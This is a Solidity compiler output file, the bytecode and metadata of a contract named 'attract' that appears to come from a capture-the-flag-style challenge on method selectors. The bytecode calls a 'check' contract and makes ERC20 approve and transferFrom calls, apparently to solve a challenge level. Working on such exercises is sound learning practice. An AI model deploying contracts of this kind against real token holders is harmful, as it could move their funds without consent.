PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x119 SWAP2 SWAP1 PUSH3 0x18E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH3 0x276 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x171 DUP2 PUSH3 0x242 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x188 DUP2 PUSH3 0x25C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x1A1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x1B1 DUP5 DUP3 DUP6 ADD PUSH3 0x160 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x1CD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x1DD DUP5 DUP3 DUP6 ADD PUSH3 0x177 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1F3 DUP3 PUSH3 0x222 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x207 DUP3 PUSH3 0x1E6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x21B DUP3 PUSH3 0x1E6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x24D DUP2 PUSH3 0x1FA JUMP JUMPDEST DUP2 EQ PUSH3 0x259 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH3 0x267 DUP2 PUSH3 0x20E JUMP JUMPDEST DUP2 EQ PUSH3 0x273 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0xA05 DUP1 PUSH3 0x286 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5C009DB EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x4FA10CFC EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xBA36F423 EQ PUSH2 0x6E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x78 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x58 PUSH2 0x348 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x65 SWAP2 SWAP1 PUSH2 0x83D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x76 PUSH2 0x3E7 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH4 0x9F29381D PUSH1 0xE0 SHL SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3E666D20 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH1 0xA0 PUSH1 0x0 PUSH2 0x112 PUSH2 0x348 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP8 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x133 SWAP7 SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x75A JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x161 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x785E9E86 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x203 SWAP2 SWAP1 PUSH2 0x68F JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ADDRESS PUSH8 0x8AC7230489E80000 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x267 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x7C2 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x281 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x295 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2B9 SWAP2 SWAP1 PUSH2 0x666 JUMP JUMPDEST POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x66A3FDB1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x313 SWAP2 SWAP1 PUSH2 0x822 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x32D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x341 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x60 ADDRESS PUSH8 0x8AC7230489E80000 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x365 SWAP3 SWAP2 SWAP1 PUSH2 0x7F9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x95EA7B300000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH4 0x9F29381D PUSH1 0xE0 SHL SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3E666D20 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH1 0xA0 PUSH1 0x0 PUSH2 0x481 PUSH2 0x348 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP8 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4A2 SWAP7 SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x75A JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4BC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4D0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ADDRESS PUSH8 0x8AC7230489E80000 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x55B SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x7C2 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x575 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x589 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5AD SWAP2 SWAP1 PUSH2 0x666 JUMP JUMPDEST POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x66A3FDB1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x607 SWAP2 SWAP1 PUSH2 0x822 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x621 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x635 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x64B DUP2 PUSH2 0x9A1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x660 DUP2 PUSH2 0x9B8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x678 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x686 DUP5 DUP3 DUP6 ADD PUSH2 0x63C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x6A1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x6AF DUP5 DUP3 DUP6 ADD PUSH2 0x651 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x6C1 DUP2 PUSH2 0x87B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x6D0 DUP2 PUSH2 0x88D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x6DF DUP2 PUSH2 0x899 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6F0 DUP3 PUSH2 0x85F JUMP JUMPDEST PUSH2 0x6FA DUP2 DUP6 PUSH2 0x86A JUMP JUMPDEST SWAP4 POP PUSH2 0x70A DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x95D JUMP JUMPDEST PUSH2 0x713 DUP2 PUSH2 0x990 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x727 DUP2 PUSH2 0x915 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x736 DUP2 PUSH2 0x927 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x745 DUP2 PUSH2 0x939 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x754 DUP2 PUSH2 0x94B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xC0 DUP3 ADD SWAP1 POP PUSH2 0x76F PUSH1 0x0 DUP4 ADD DUP10 PUSH2 0x6B8 JUMP JUMPDEST PUSH2 0x77C PUSH1 0x20 DUP4 ADD DUP9 PUSH2 0x6B8 JUMP JUMPDEST PUSH2 0x789 PUSH1 0x40 DUP4 ADD DUP8 PUSH2 0x71E JUMP JUMPDEST PUSH2 0x796 PUSH1 0x60 DUP4 ADD DUP7 PUSH2 0x74B JUMP JUMPDEST PUSH2 0x7A3 PUSH1 0x80 DUP4 ADD DUP6 PUSH2 0x6C7 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0xA0 DUP4 ADD MSTORE PUSH2 0x7B5 DUP2 DUP5 PUSH2 0x6E5 JUMP JUMPDEST SWAP1 POP SWAP8 SWAP7 POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x7D7 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x6B8 JUMP JUMPDEST PUSH2 0x7E4 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x6B8 JUMP JUMPDEST PUSH2 0x7F1 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x72D JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x80E PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x6B8 JUMP JUMPDEST PUSH2 0x81B PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x73C JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x837 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x6D6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x857 DUP2 DUP5 PUSH2 0x6E5 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x886 DUP3 PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8D0 DUP3 PUSH2 0x87B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x920 DUP3 PUSH2 0x8F7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x932 DUP3 PUSH2 0x8F7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x944 DUP3 PUSH2 0x901 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x956 DUP3 PUSH2 0x8F7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x97B JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x960 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x98A JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9AA DUP2 PUSH2 0x88D JUMP JUMPDEST DUP2 EQ PUSH2 0x9B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x9C1 DUP2 PUSH2 0x8C5 JUMP JUMPDEST DUP2 EQ PUSH2 0x9CC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GASLIMIT DUP1 0xEB SWAP5 0x22 0xDC 0xFC 0xD2 0xC8 RETURN XOR 0xE3 PUSH7 0x8EA7B3C57DDDD0 SDIV PUSH5 0x4A32479CA9 0xBB EQ EXTCODESIZE STATICCALL 0xCD PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "513000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"att()": "infinite",
						"attract1()": "infinite",
						"getdata()": "infinite"
					}
				},
				"methodIdentifiers": {
					"att()": "ba36f423",
					"attract1()": "05c009db",
					"getdata()": "4fa10cfc"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 496,
						"contract": "shoot/3/方法选择器的计算/1.sol:attract",
						"label": "che",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(check)674"
					},
					{
						"astId": 499,
						"contract": "shoot/3/方法选择器的计算/1.sol:attract",
						"label": "erc20",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(ERC20)350"
					}
				],
				"types": {
					"t_contract(ERC20)350": {
						"encoding": "inplace",
						"label": "contract ERC20",
						"numberOfBytes": "20"
					},
					"t_contract(check)674": {
						"encoding": "inplace",
						"label": "contract check",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}